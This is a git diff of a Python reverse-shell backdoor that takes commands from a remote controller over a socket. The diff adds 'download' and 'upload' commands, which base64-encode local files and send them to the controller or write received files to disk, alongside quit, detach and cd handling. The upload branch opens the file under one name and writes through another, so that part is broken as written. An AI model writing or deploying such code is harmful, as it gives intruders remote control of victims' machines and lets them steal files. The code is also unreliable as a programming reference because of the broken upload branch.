@@ -2,6 +2,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 def send(data):
     json_data = json.dumps(data)
@@ -19,13 +20,25 @@ def receive():
 def shell():
     while True:
         command = receive()
-	if command == "":
-	    continue
-        if command == 'detach':
+        if command == "":
             continue
-	elif command == "quit":
-	    sock.close()
-	    break
+
+        elif command[:8] == "download":
+            with open(command[9:], "rb") as file:
+                send(base64.b64encode(file.read()))
+
+        elif command[:6] == "upload":
+            with open(command[7:], "wb") as uload:
+                file_data = receive()
+                file.write(base64.b64decode(file_data))
+
+        elif command == 'detach':
+            continue
+
+        elif command == "quit":
+            sock.close()
+            break
+
         elif command[:2] == 'cd' and len(command) > 1:
             try:
                 os.chdir(command[3:])
